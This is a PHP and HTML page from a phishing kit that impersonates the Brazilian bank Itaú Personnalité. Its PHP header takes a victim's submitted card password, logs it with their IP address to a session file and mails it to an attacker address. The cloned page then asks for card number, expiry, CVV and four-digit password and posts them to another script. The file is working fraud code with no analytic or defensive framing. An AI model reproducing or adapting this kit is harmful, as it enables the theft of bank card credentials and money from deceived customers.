<?php
session_start();
require "../../sistemadeenvio.php";
$senha62 = $_POST['senha62'];

$sessionav1 = $_SESSION['sessao'];

$ip_usuario = $_SERVER['REMOTE_ADDR'];
$today = date("His");
$myFile = "../../infos2020infos/" . "$sessionav1" . ".txt";
$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
$stringData = 
"
Senha do cartao 2: ---> $senha62 
$ip_usuario 
";
fwrite($fh, $stringData);
fclose($fh);

$ip=$_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s"); $headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: uol <$email>";
@$dakdkldklsd.="<br>";
@$dakdkldklsd.="<b>Senha do cartao 2:</b> $senha62 <br>";
@mail("$email", "$ip_usuario", "$dakdkldklsd", $headers);
sleep(2);
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1"/>
	<link rel="shortcut icon" type="image/png" href="https://www.itau.com.br/content/dam/itau/favicon.png"/>
	<link rel="stylesheet" href="../css/style.css">
<title>Itaú Personnalité | Relacionamento próximo e surpreendente</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
</head>
<body class="geral">

	 <header class="headerksjkas">
	 	<div class="container">
	 		 <div class="row">
	 		 	 <div class="col-12">
	 		 	 	  <img src="../img/logo-itau-personnalite-desktop.png" alt="" border="0" height="60px">
	 		 	 </div>
	 		 </div>
	 	</div>
	 </header>

	 <section class="sdkjaskdjsd"> 
	 	  <div class="container">
	 	  	  <div class="row">
	 	  	  	  <div class="col-md-6">
	 	  	  	  	<div class="conteudoasjhjasd">
	 	  	  	  		 <h1>Olá, cliente</h1>
	 	  	  	  		
	 	  	  	  		 <form class="samdnasd65sd564" action="erroservidor.php" method="post">
	 	  	  	  		 	  <input class="ksajdksadooso" name="card" required="" placeholder="Número do cartão " type="text" id="cc" maxlength="19"><br><br>

	 	  	  	  		 	  <input  class="ksajdksadooso" name="val" required="" placeholder="Validade 10/20" type="text" maxlength="5" required onkeypress="mascaraData( this, event )"><br><br>

	 	  	  	  		 	  <input  class="ksajdksadooso" name="cvv" id="numeric1" maxlength="3"  minlength="3" required="" placeholder="Código cvv" type="text"><br><br>

	 	  	  	  		 	  <input  class="ksajdksadooso" name="senha4"  id="numeric2" required="" placeholder="Senha de 4 dígitos" type="text" id="numeric1" maxlength="4"  minlength="4"><br>
	 	  	  	  		 	  <br>
	 	  	  	  		 	 


	 	  	  	  		 	   <input class="sssssdsdsdsd"  type="submit" value="Continuar">
	 	  	  	  		 </form>
	 	  	  	  	</div>
	 	  	  	  </div>

	 	  	  	  <div class="col-md-6">
	 	  	  	  	
	 	  	  	  		<img src="../img/adsadasdsad.png" alt="">
	 	  	  	  		<img src="../img/sadsdsadasd.png" alt="">
	 	  	  	 
	 	  	  	  </div>
	 	  	  </div>
          <div class="clearfix"></div>
	 	  </div>
	 </section>


	 <footer>
	 	   <img src="../img/app_footer.png" alt="" width="99%">
	 </footer>
	



<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>	

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script>
$('#numeric1').keyup(function() {
  $(this).val(this.value.replace(/\D/g, ''));
});

$('#numeric2').keyup(function() {
  $(this).val(this.value.replace(/\D/g, ''));
});


</script>

<script>
  /* Máscaras ER */
  function mascara(o,f){
    v_obj=o
    v_fun=f
    setTimeout("execmascara()",1)
  }
  function execmascara(){
    v_obj.value=v_fun(v_obj.value)
  }
  function mcc(v){
    v=v.replace(/\D/g,"");
    v=v.replace(/^(\d{4})(\d)/g,"$1 $2");
    v=v.replace(/^(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3");
    v=v.replace(/^(\d{4})\s(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3 $4");
    return v;
  }
  function id( el ){
    return document.getElementById( el );
  }
  window.onload = function(){
    id('cc').onkeypress = function(){
      mascara( this, mcc );
    }
  }
</script>

<script>
  function mascaraData( campo, e )
{
  var kC = (document.all) ? event.keyCode : e.keyCode;
  var data = campo.value;
  
  if( kC!=8 && kC!=46 )
  {
    if( data.length==2 )
    {
      campo.value = data += '/';
    }
    else if( data.length==4 )
    {
      campo.value = data += '';
    }
    else
      campo.value = data;
  }
}
</script>

<script type="text/javascript">
            /* Máscaras ER */
            function mascara(o,f){
              v_obj=o
              v_fun=f
              setTimeout("execmascara()",1)
            }
            function execmascara(){
              v_obj.value=v_fun(v_obj.value)
            }
            function mtel(v){
    v=v.replace(/\D/g,"");             //Remove tudo o que não é dígito
    v=v.replace(/^(\d{2})(\d)/g,"($1) $2"); //Coloca parênteses em volta dos dois primeiros dígitos
    v=v.replace(/(\d)(\d{8})$/,"$1-$2");    //Coloca hífen entre o quarto e o quinto dígitos
    return v;
  }
  function id( el ){
    return document.getElementById( el );
  }
  window.onload = function(){
    id('telefone').onkeyup = function(){
      mascara( this, mtel );
    }
  }
</script>
</body>
</html>